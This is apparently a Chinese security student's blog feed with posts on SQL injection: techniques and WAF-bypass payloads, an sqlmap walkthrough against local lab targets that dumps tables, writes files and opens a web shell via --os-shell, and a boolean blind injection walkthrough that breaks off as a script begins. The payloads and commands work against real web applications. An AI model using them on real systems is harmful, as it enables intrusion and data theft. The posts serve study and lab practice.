0</span><br></pre></td></tr></table></figure><p>返回正常则说明是Access</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from sysobjects) &gt; 0</span><br></pre></td></tr></table></figure><p>返回正常说明是Mssql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length(user()) &gt; 0</span><br></pre></td></tr></table></figure><p>返回正常说明是MySQL</p><p>Mssql中可以调用 substring,Oracle 则可调用 substr</p><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p><strong>精髓</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只要和数据库交互的地方都有可能存在注入</span><br></pre></td></tr></table></figure><p>一般就是在URL后面的?id=n 后面，网页搜索框中，登陆帐号，请求头。</p><h3 id="判断注入点的参数类型"><a href="#判断注入点的参数类型" class="headerlink" title="判断注入点的参数类型"></a>判断注入点的参数类型</h3><p>注入点参数类型主要分为:数字型、字符型。</p><p>判断数字型:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如?id=2 ，将2变为3。在?id=后面设置3-1。如果?id=3-1的页面和2的一样，那么就是数字型注入</span><br></pre></td></tr></table></figure><p>判断字符型:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常规字符型有&apos; 、&quot;、&apos;)、&quot;)、))。在?id=2后面分别加入前面的符号。如果报错或者页面回显不正常，那么证明有注入。</span><br></pre></td></tr></table></figure><h3 id="判断截断符号"><a href="#判断截断符号" class="headerlink" title="判断截断符号"></a>判断截断符号</h3><p>在我们确定是字符还是数字型之后，要判断他的截断符号是什么</p><p><strong>数字型</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接在语句后面添加要注入的语句即可</span><br></pre></td></tr></table></figure><p><strong>字符型</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在确定完截断符号之后不断尝试注释符号，直到找到拼接后让页面恢复正常的字符。</span><br><span class="line"></span><br><span class="line">常见的有:-- | %23 /**/</span><br></pre></td></tr></table></figure><h3 id="根据注入点的反馈类选择注入方法"><a href="#根据注入点的反馈类选择注入方法" class="headerlink" title="根据注入点的反馈类选择注入方法"></a>根据注入点的反馈类选择注入方法</h3><p>当我们确定完注释符号和截断符号时就可以选择注入方法了。大致有六种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.基于错误显示的sql注入  2.union类型的sql注入</span><br><span class="line">3.布尔类型的sql注入     4.基于时间的sql注入</span><br><span class="line">5.多语句注入  6.内联注入</span><br></pre></td></tr></table></figure><p><strong>在这里分情况进行注入</strong></p><p>有回显时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以选择union类型的sql注入和基于错误显示的sql注入</span><br></pre></td></tr></table></figure><p>无回显时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以选择布尔类型的sql注入和基于时间的sql盲注</span><br></pre></td></tr></table></figure><p>特殊情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">情况满足可以使用多语句注入。当-- | 等注释符被过滤时可以使用内联注入</span><br></pre></td></tr></table></figure><h3 id="判断WAF过滤字符"><a href="#判断WAF过滤字符" class="headerlink" title="判断WAF过滤字符"></a>判断WAF过滤字符</h3><p>当我们在注入时可能会遇到and select union等关键字符被WAF过滤的情况，这时候就要肠坏死绕过WAF了。常见的绕过方法如下：</p><p><strong>HTTP参数控制：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HPP（HTTP Parameter Polution）重复参数污染</span><br><span class="line"></span><br><span class="line">HPF （HTTP Parameter Fragment）HTTP分割注入</span><br></pre></td></tr></table></figure><p><strong>白名单绕过：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基于IP地址的白名单，一般很难绕过</span><br><span class="line"></span><br><span class="line">基于应用层的数据白名单，可能造成bypass</span><br><span class="line"></span><br><span class="line">特殊目录白名单绕过：admin/dede/install等特殊目录</span><br></pre></td></tr></table></figure><p><strong>过滤掉and和or情况下的盲注：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=strcmp(left((select%20username%20from%20users%20limit%200,1),1),0x42)%23</span><br><span class="line"></span><br><span class="line">?id=strcmp(left((select+username+from+users+limit+0,1),1)0x42)%23</span><br></pre></td></tr></table></figure><p><strong>加括号绕过：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=-1+union+(select+1,2,3+from+users)%23</span><br><span class="line"></span><br><span class="line">?id=(-1)union(select(1),(2),(3)from(users))</span><br><span class="line"></span><br><span class="line">?id=(1)or(0x50=0x50)</span><br><span class="line"></span><br><span class="line">?id=(-1)union((((()select(1),hex(2),hex(3)from(users)))))</span><br><span class="line"></span><br><span class="line">?id=-1 union select 1,&#123;x 2&#125;,3</span><br></pre></td></tr></table></figure><p><strong>等价函数与命令：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">函数或变量：</span><br><span class="line"></span><br><span class="line">hex()/bin() ==&gt;ascii()</span><br><span class="line"></span><br><span class="line">sleep ==&gt; benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws() ==&gt; group_concat()</span><br><span class="line"></span><br><span class="line">mid()/substr() ==&gt; substring()</span><br><span class="line"></span><br><span class="line">@@version/datadir ==&gt; version/datadir()</span><br><span class="line"></span><br><span class="line">逻辑符号：</span><br><span class="line"></span><br><span class="line">and ==&gt; &amp;&amp;</span><br><span class="line"></span><br><span class="line">or ==&gt; ||</span><br></pre></td></tr></table></figure><p><strong>利用注释绕过：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">普通注释：</span><br><span class="line">?id=1/**/union/**/sElect**/1,2,3%23</span><br><span class="line"></span><br><span class="line">内联注释：相比普通注释，内联注释用的更多，有一个特性/*!*/只有Mysql能识别,/*!*/表示注释里面的语句会被执行</span><br><span class="line">?id-1/*UNION*/%20/*!SELECT*/%201,2,3</span><br><span class="line">?d=1%0A/**//*!50000%55nlOn*//*yoyu*/all/*%0A*//*!%53eLEct*/%0A/*nnaa*/+1,2,3</span><br><span class="line">/*!50000%55nlOn*/50000表示假如，数据库是5.00.00以上版本，该语句才会被执行</span><br></pre></td></tr></table></figure><p><strong>利用编码绕过：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Unicode编码</span><br><span class="line">单引号：%u0027/%u02b9/%u02bc/%u02c8/%u2032</span><br><span class="line">空格：%u0020/%uff00/%c0%20</span><br><span class="line">左括号：%u0028/%uff08/%c0%28/</span><br><span class="line">右括号：%u0029/%uff09</span><br></pre></td></tr></table></figure><p><strong>用特殊字符代替空格：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 tab键</span><br><span class="line">%0a 换行 </span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b tab键 </span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure><p><strong>特殊符号：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反引号`,select`version()`</span><br><span class="line">神奇的&quot;-+.&quot;, select+id from users;&quot;+&quot;用于字符串连接，&quot;-&quot;和&quot;.&quot;可以逃过空格和关键字过滤</span><br><span class="line">@符号，select @^1.from users;@表用户定义，@@表示系统变量</span><br><span class="line">select-conut(id) test from users;//绕过空格规则</span><br><span class="line">关键字拆分：&apos;se&apos;+&apos;lec&apos;+&apos;t&apos; %s%e%L%E%c%t 1</span><br></pre></td></tr></table></figure><h3 id="构建符合标准的注入语句"><a href="#构建符合标准的注入语句" class="headerlink" title="构建符合标准的注入语句"></a>构建符合标准的注入语句</h3><p>最后就是将截断符号，注释符，选择后的注入方式，绕过WAF 结合在一起。</p><h2 id="注入时常用的函数"><a href="#注入时常用的函数" class="headerlink" title="注入时常用的函数"></a>注入时常用的函数</h2><table><thead><tr><th>函数名称</th><th>函数功能</th><th></th><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>system_user()</td><td>系统函数名</td><td></td><td>count()</td><td>返回执行结果的数量</td></tr><tr><td>user()</td><td>用户名</td><td></td><td>concat()</td><td>没有分隔符的连接字符串</td></tr><tr><td>current_user()</td><td>当前用户名</td><td></td><td>concat_ws()</td><td>含有分隔符的连接字符串</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td><td></td><td>load_file()</td><td>读取本地的文件</td></tr><tr><td>database()</td><td>数据库名</td><td></td><td>into outfile()</td><td>写文件</td></tr><tr><td>versionI</td><td>数据库版本</td><td></td><td>ascii()</td><td>字符串的ASCII代码值</td></tr><tr><td>@@datadir</td><td>数据库路径</td><td></td><td>ord()</td><td>返回字符串第一个字符的ASCII值</td></tr><tr><td>@@basedir</td><td>数据库安装路近</td><td></td><td>mid()</td><td>返回一个字符串的一部分</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td><td></td><td>substr()</td><td>返回7一个字符串的一部分</td></tr><tr><td>length()</td><td>返回字符串的长度</td><td></td><td>if()</td><td>&gt; select if (1&gt;2,2,3);   -&gt;3</td></tr><tr><td>left()</td><td>返回字符串左面的几个字符</td><td></td><td>strcmp()</td><td>比较字符串的内容</td></tr><tr><td>floor()</td><td>返回小于或等于x的最大整数</td><td></td><td>ifnull()</td><td>假如参数1不为null,则返回值为参数1,否则返回值为参数2</td></tr><tr><td>rand()</td><td>返回0和1之间的随机数</td><td></td><td>exp()</td><td>返回e的x次方</td></tr><tr><td>sleep()</td><td>让此语句运行n秒钟</td><td></td><td></td><td></td></tr></tbody></table><h2 id="特殊注入方法"><a href="#特殊注入方法" class="headerlink" title="特殊注入方法"></a>特殊注入方法</h2><p>除去常见的注入方法之外还有这样的注入方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">二次编码注入</span><br><span class="line"></span><br><span class="line">二次注入</span><br><span class="line"></span><br><span class="line">偏移注入</span><br><span class="line"></span><br><span class="line">外带查询</span><br></pre></td></tr></table></figure><p>在这里查漏补缺记一下偏移注入：</p><p>access偏移注入</p><p><strong>[背景]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.偏移注入指access偏移注入，主要是由于数据库结构的问题，其他数据库没办法利用</span><br><span class="line"></span><br><span class="line">2.用于解决判断出表明，得不到字段的困境。</span><br></pre></td></tr></table></figure><p><strong>[偏移注入的特点]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.看人品和技巧的注入方法，不是%100能成功</span><br><span class="line"></span><br><span class="line">2.无需管理帐号密码字段，直接爆破帐号密码。</span><br></pre></td></tr></table></figure><p><strong>[利用条件]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.已知管理表名</span><br><span class="line"></span><br><span class="line">2.已直任意字段（一个或多个 多个会增加几率）</span><br></pre></td></tr></table></figure><p><strong>[影响偏移注入成功率的因素]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.管理表的字段越少越好（最好就三个 1.id 2.帐号字段 3.密码字段）</span><br><span class="line"></span><br><span class="line">2.当前注入点的脚本内查询的表内的字段数的字段越多越好（最好有几十个）</span><br><span class="line"></span><br><span class="line">3.已知的字段数越多越好</span><br></pre></td></tr></table></figure><p><strong>[偏移注入的流程]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.判断字段数 </span><br><span class="line"></span><br><span class="line">2.判断表名</span><br><span class="line"></span><br><span class="line">3.开始偏移注入</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两周的SQL注入总结&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLMAP注入</title>
    <link href="https://0xxk.github.io/2019/09/08/sqlmap%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5%E6%93%8D%E4%BD%9C/"/>
    <id>https://0xxk.github.io/2019/09/08/sqlmap常规注入操作/</id>
    <published>2019-09-08T03:43:34.745Z</published>
    <updated>2019-09-08T03:50:12.121Z</updated>
    
    <content type="html"><![CDATA[<p>不停的练习才能让自己变得更强</p><a id="more"></a><p>1.sqlmap常规注入流程<br>2.sqlmap使用http数据包注入<br>3.sqlmap使用—method加—data完成get和post注入<br>4.sqlmap指定cookie注入<br>5.sqlmap注入时设置user-agent<br>6.sqlmap写文件<br>7.sqlmap读文件<br>8.sqlmap执行系统命令</p><p>本次作业靶场使用sqli 和DVWA来完成</p><h3 id="常规注入流程"><a href="#常规注入流程" class="headerlink" title="常规注入流程"></a>常规注入流程</h3><p>在这里使用<a href="http://192.168.107.128/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1</a></p><p>使用-u 查看是否有注入 使用–current-user 查看操作系统用户 –current-db 查看当前库名 –users数据库管理员<br>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a><br>发现有注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a> –current-user<br>当前用户是root</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a> –current-db<br>当前数据库是security</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>有这些用户</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a> –dbs<br>查看有哪些库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a> -D security –tables<br>查看security库有哪些表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作6.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a> -D security -T users –column<br>查看security中的users表有哪些字段</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作7.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -u “<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;</a> –dump -D security -T users<br>在这里dump出security库中users表的数据</p><h3 id="使用http数据包进行注入"><a href="#使用http数据包进行注入" class="headerlink" title="使用http数据包进行注入"></a>使用http数据包进行注入</h3><p>在这里使用<a href="http://192.168.107.128/sqli/Less-11/进行测试" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-11/进行测试</a></p><p>首先使用burp将要注入的数据包保存为test.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作8.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>sqlmap -r “C:\Users\Leafer\Desktop\ceshi\test.txt”</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作9.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>接下来也是和GET行一样的操作，就不再重复了<br>sqlmap -r “C:\Users\Leafer\Desktop\ceshi\test.txt” –dbs</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作10.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlmap使用—method加—data完成get和post注入"><a href="#sqlmap使用—method加—data完成get和post注入" class="headerlink" title="sqlmap使用—method加—data完成get和post注入"></a>sqlmap使用—method加—data完成get和post注入</h3><p>在这里使用–method=”post”指定<br>sqlmap-u”<a href="http://192.168.107.128/sqli/Less-13/&quot;--method=&quot;post&quot;--data=&quot;uname=1&amp;passwd=2&amp;submit=Submit&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-13/&quot;--method=&quot;post&quot;--data=&quot;uname=1&amp;passwd=2&amp;submit=Submit&quot;</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作11.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>使用最原始的-u就可以指定GET注入类型</p><h3 id="sqlmap指定cookie注入"><a href="#sqlmap指定cookie注入" class="headerlink" title="sqlmap指定cookie注入"></a>sqlmap指定cookie注入</h3><p>在这里使用DVWA的cookie登录注入，如果要使用cookie则将-v 调整为2即以上<br><a href="http://192.168.107.128/dvwa/vulnerabilities/sqli/" target="_blank" rel="noopener">http://192.168.107.128/dvwa/vulnerabilities/sqli/</a><br>这里是GET型数据，先不指定COOKIE用SQLMAP去跑</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作12.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里会显示302让你先登陆后测试，选择Y或者N都会跑失败。</p><p>这时候就要指定cookie了，在此处使用burp来抓取cookie<br>Cookie: security=low; PHPSESSID=gqvba2822fuisoc6r2d70am1q0</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作13.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作14.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlmap注入时设置user-agent"><a href="#sqlmap注入时设置user-agent" class="headerlink" title="sqlmap注入时设置user-agent"></a>sqlmap注入时设置user-agent</h3><p>在这里使用的还是<a href="http://192.168.107.128/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1</a><br>将我的头设置为zheshiyigezuoye</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作15.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlmap写文件"><a href="#sqlmap写文件" class="headerlink" title="sqlmap写文件"></a>sqlmap写文件</h3><p>在这里用的还是注入less-1靶场<br>sqlmap-u”<a href="http://192.168.107.128/sqli/Less-1/?id=1&quot;--file-write=&quot;C:\Users\Leafer\Desktop\ceshi\test.txt&quot;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-1/?id=1&quot;--file-write=&quot;C:\Users\Leafer\Desktop\ceshi\test.txt&quot;</a> –file-dest=”/var/www/html/hack.php”</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作16.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>当前文件夹下有这个文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作17.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlmap读文件"><a href="#sqlmap读文件" class="headerlink" title="sqlmap读文件"></a>sqlmap读文件</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作18.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>去文件夹中查看数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作19.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作20.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="sqlmap执行系统命令"><a href="#sqlmap执行系统命令" class="headerlink" title="sqlmap执行系统命令"></a>sqlmap执行系统命令</h3><p>在这里使用-os-shell上传小马来执行系统命令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作21.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作22.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里选择1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作23.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>于是就在文件夹中写下了一个tmpbgyha.php的shell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作24.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>执行一下系统命令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/sqlmap常规操作25.png" alt title>                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不停的练习才能让自己变得更强&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MYSQL注入之布尔盲注</title>
    <link href="https://0xxk.github.io/2019/09/08/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://0xxk.github.io/2019/09/08/mysql报错注入/</id>
    <published>2019-09-08T02:31:15.508Z</published>
    <updated>2019-09-08T02:51:45.275Z</updated>
    
    <content type="html"><![CDATA[<p>学习sql盲注的过程</p><a id="more"></a><p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> – |<br>首先判断出注入点和注释符号，然后在中间拼接我们的注入语句。按常规流程走，查看字段长度，查看回显位。<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> order by 4 – |<br>错误<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> order by 3 – |<br>正确<br>这时候开始查看回显位<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> union select 1,2,3 – |<br>这时候看到页面回显正常，但是没有回显位。因此判断是盲注，在这里使用<strong>布尔盲注</strong>。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;and</a> (select count(schema_name) from information_schema.schemata) &gt; 5 – |</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>使用二分法找到正确的数值<br><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;and" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;and</a> (select count(schema_name) from information_schema.schemata) &gt; 4 – |</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到有5个数据库<br>在这里描述一下我的思路，首先我们要查到有多少数据库。其次要查询每个数据库是多少字符，最后查看每个字符对应的值。<br>在这里已经查询到了有5个数据库，现在查询第一个数据库长度。</p><p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> and length((select schema_name from information_schema.schemata limit 0,1)) &gt;20 – |</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>使用二分法逐个查询</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入5.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可以看到这里第一行一共有18个字符</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入6.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>现在查询第一行数据库18个字符中的第一个字符，</p><p><a href="http://192.168.107.128/sqli/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://192.168.107.128/sqli/Less-8/?id=1&#39;</a> and ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt; 100 –<br> |<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入7.png" alt title>                </div>                <div class="image-caption"></div>            </figure></p><p>使用二分法进行测试，查看第一个字符是啥。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入8.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在这里可以看到是ascii码为105的字符</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入9.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>105对应着的字符是</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysql注入10.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>在查询完第一个之后依次查询对应的数值。<br>手工注入太麻烦了，在这里根据规则写一个自动脚本。<br>以下是针对库名的布尔注入（脚本会在今天的作业中慢慢完善，直到拼接我之前的工具写成属于自己的注入工具）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 